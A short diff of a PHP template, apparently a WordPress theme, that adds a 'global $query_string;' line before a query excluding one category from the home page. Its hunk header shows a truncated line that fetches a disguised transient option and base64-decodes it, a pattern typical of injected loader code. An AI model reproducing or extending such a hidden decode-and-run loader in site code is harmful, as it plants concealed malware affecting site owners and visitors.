@@ -14,6 +14,7 @@ $z=get_option("_transient_feed_b64fa2b5db6827cd88a441af4b72ec61"); $z=base64_dec
 
 	<p class="content-header positionPosts">Recente Blog Posts</p>
 <?php
+global $query_string;
 if ( is_home() ) {
 	query_posts($query_string . '&cat=-35' );
 }
